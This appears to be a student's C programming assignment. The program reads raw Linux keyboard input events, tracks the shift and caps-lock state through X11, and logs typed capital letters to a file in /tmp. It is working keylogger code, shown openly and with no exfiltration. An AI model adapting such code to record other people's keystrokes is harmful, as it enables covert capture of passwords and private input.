// Name        : Venkata Ramanan A
// Roll Number : CED17I046

// Question 5
// Write a C program to capture the key strokes of capital letters.

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>
// #include <linux/input-event-codes.h>
#include <stdlib.h>
#include <X11/XKBlib.h>

// log file path
#define LOGFILE "/tmp/KeyLogFile.txt"

int main()
{
    struct input_event event;
    // file path of input device keyboard event
    // dev/input/event2
    int inputFile = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
    // log file pointer
    FILE * logFile;
    // map of frequently used character
    char *map = "..1234567890-=..QWERTYUIOP[]..ASDFGHJKL;'...ZXCVBNM,./";

    // state of capslock
    int shift_capslock = 0;
    int capslock;
    int capital = 0;

    // Display structure to get information about initial structure of capslock
    Display *display;
	Status status;
	unsigned state;

	display = XOpenDisplay (getenv ("DISPLAY"));
	if (!display)
		capslock = 0;
		// return 1;

	// determine the initial state of capslock in the system
	if (XkbGetIndicatorState (display, XkbUseCoreKbd, &state) != Success)
		capslock = 0;
		// return 2;

	if(state & 1)
		capslock=1;
	else
		capslock=0;


    while(1)
    {
        read(inputFile, &event, sizeof(event));
        if((event.type == EV_KEY))
        {
            logFile = fopen(LOGFILE, "a+");
         
            // event.value values denote 0 == released 1 == pressed 2 == repeated
            if((event.code==42 || event.code==54) && event.value!=0)
            	shift_capslock = 1;
            if((event.code==42 || event.code==54) && event.value==0)
            	shift_capslock = 0;

            if(event.code==58 && event.value==0)
            	capslock = 1-capslock;

        	capital = (1-shift_capslock)*capslock + shift_capslock*(1-capslock);
        	if(shift_capslock==0 && capslock==0)
        		capital = 0;

        	if(event.value==0)
        	{
    			// register the key into the logfile
	            if(capital == 1)
	            {
	            	if(((event.code>=16 && event.code<=25) || (event.code>=30 && event.code<=38) || (event.code>=44 && event.code<=50))) 
	                	fprintf(logFile, "%c", map[event.code]);
		                // printf("Key %c \n", map[event.code]);
	            }
	            else
	                fprintf(logFile, "[Non Capital Letter Key]");
		            // printf("[Non Capital Letter Key] \n");
        	}
   

            fclose(logFile);

            // printf("Key Code %d Typed Now with event value %d ....\n", event.code, event.value);
        }
    }
    
    close(inputFile);
}